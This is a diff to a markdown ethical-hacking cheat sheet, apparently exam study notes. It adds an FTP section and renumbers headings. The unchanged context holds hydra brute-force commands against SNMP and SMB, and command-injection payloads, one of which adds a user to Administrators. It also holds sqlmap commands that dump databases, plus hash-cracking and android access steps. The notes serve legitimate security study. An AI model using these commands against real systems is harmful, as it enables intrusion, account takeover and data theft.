@@ -56,10 +56,16 @@ set USERNAME admin
 - hydra -P common-snmp-community-strings.txt target.com snmp
 - hydra -l Administrator -P words.txt 192.168.1.12 smb t 1
 ```
-### 8. Prints the route that a packet takes to reach the host
+
+### 8. FTP
+```
+FTP Connect
+  $ ftp IP
+```
+### 9. Prints the route that a packet takes to reach the host
   $ traceroute google.com
 
-### 9. Android
+### 10. Android
 ```
   $ netdiscover -r IP/24   (got final IP)
   $ nmap -O IP
@@ -75,7 +81,7 @@ set USERNAME admin
   IP address again of android device
   pwd > ls > cd sdcard > ls > cd downloads > cat file.txt
 ```
-### 10. Stegnography
+### 11. Stegnography
   ```
   $ Snow.exe -C -p “given_password” file_name.txt  (Pass tu hobo = 'test')
   -C  compressing / uncompressing
@@ -84,7 +90,7 @@ set USERNAME admin
   Open Stego (GUI tool):
      Open the exe > open and select file > click get
  ```
-### 11. Cryptography
+### 12. Cryptography
 ```
 #### Identify:
 https://hashes.com/en/tools/hash_identifier
@@ -106,7 +112,7 @@ https://crackstation.net
    100 = SHA1
    1400 = SHA256
   ``` 
-## 12. Used Tools
+## 13. Used Tools
 ```
 Veracrypt = Encryt / Decrypt the Hidden Disk 
 Cryptool
@@ -122,7 +128,7 @@ Winscp
 OWASP ZAP  
 RDP
 ```
-### 13. Command Injection
+### 14. Command Injection
 ```
 Severity: Low        Severity: Medium           Severity: High          
 1; ls                1& ls                      || ls
@@ -142,7 +148,7 @@ Severity: Low        Severity: Medium           Severity: High
 | net localgroup Administrators Test /Add
 Successfully created the "Test" user account.
 ```
-### 14 SQL Injection with SQLmap:
+### 15 SQL Injection with SQLmap:
   ```
   $ sqlmap -u http://site.com?id=1 --cookie="cookies" --risk 3 --level 5 --dbms=mysql --dbs
   $ sqlmap -u "http://site.com/sqli/?id=1&Submit=Submit" --cookie="cookies1;cookies2" --data="data" --risk 3 -level 5 --dbms=mysql --dbs
@@ -151,7 +157,7 @@ Successfully created the "Test" user account.
   $ sqlmap -r test.txt --batch --risk 3 --level 4 -D databasename --tables
   $ sqlmap -r test.txt --batch --risk 3 --level 4 -D databasename -T tables name --dump
 ```
-### 15. Wireshark
+### 16. Wireshark
 ```
 Filters:
 To find DOS (SYN and ACK) : tcp.flags.syn == 1, tcp.flags.syn == 1 and tcp.flags.ack == 0
